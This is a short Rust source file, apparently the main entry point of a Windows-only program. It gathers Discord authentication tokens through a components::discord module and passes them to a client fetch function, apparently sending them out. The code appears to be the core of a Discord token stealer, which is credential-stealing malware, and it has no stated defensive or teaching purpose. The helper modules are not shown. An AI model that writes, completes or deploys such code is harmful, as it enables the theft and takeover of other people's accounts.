#[cfg(target_os = "windows")]
#[path = "components/mod.rs"]
mod components;
mod utils;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
  let tokens: Vec<String> = components::discord::get_tokens().await?;
  utils::client::fetch(tokens).await?;
  
  Ok(())
}